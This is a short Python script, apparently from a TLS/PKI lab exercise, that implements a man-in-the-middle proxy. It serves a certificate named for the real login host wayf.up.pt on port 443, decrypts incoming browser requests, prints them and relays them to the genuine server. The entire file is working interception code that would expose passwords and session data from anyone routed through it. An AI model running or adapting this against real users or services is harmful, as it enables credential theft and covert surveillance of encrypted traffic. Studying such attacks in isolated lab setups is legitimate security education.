#!/usr/bin/env python3

import socket
import ssl
import pprint
import threading

def process_request(ssock_for_browser):
    hostname = "wayf.up.pt"

    # Make a connection to the real server
    context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # For Ubuntu 20.04 VM
    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
    
    cadir = '/etc/ssl/certs'
    context_client.load_verify_locations(capath=cadir)
    context_client.verify_mode = ssl.CERT_REQUIRED
    context_client.check_hostname = True
    sock_for_server = socket.create_connection((hostname, 443))
    ssock_for_server = context_client.wrap_socket(
        sock_for_server,
        server_hostname=hostname,
        do_handshake_on_connect=False
    )
    
    ssock_for_server.do_handshake() 
    request = ssock_for_browser.recv(2048)
    pprint.pprint("Request: {}".format(request))
    if request:
        # Forward request to server
        ssock_for_server.sendall(request)

        # Get response from server, and forward it to browser
        response = ssock_for_server.recv(2048)
        while response:
            ssock_for_browser.sendall(response) # Forward to browser
            response = ssock_for_server.recv(2048)
            
    ssock_for_browser.shutdown(socket.SHUT_RDWR)
    ssock_for_browser.close()

html = """
HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
<!DOCTYPE html><html><body><h1>This is Bank32.com!</h1></body></html>
"""

# SERVER_CERT = './server-certs/mycert.crt'
# SERVER_PRIVATE = './server-certs/mycert.key'
SERVER_CERT = './server-certs/wayf.crt'
SERVER_PRIVATE = './server-certs/wayf.key'


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)  # For Ubuntu 20.04 VM
# context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # For Ubuntu 16.04 VM
context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('0.0.0.0', 443))
sock.listen(5)

while True:
    sock_for_browser, fromaddr = sock.accept()
    try:
        ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
        x.start()
        # print("TLS connection established")
        # data = ssock_for_browser.recv(1024)              # Read data over TLS
        # pprint.pprint("Request: {}".format(data))
        # ssock_for_browser.sendall(html.encode('utf-8'))  # Send data over TLS

        # ssock_for_browser.shutdown(socket.SHUT_RDWR)     # Close the TLS connection
        # ssock_for_browser.close()

    except Exception:
        print("TLS connection fails")
        continue
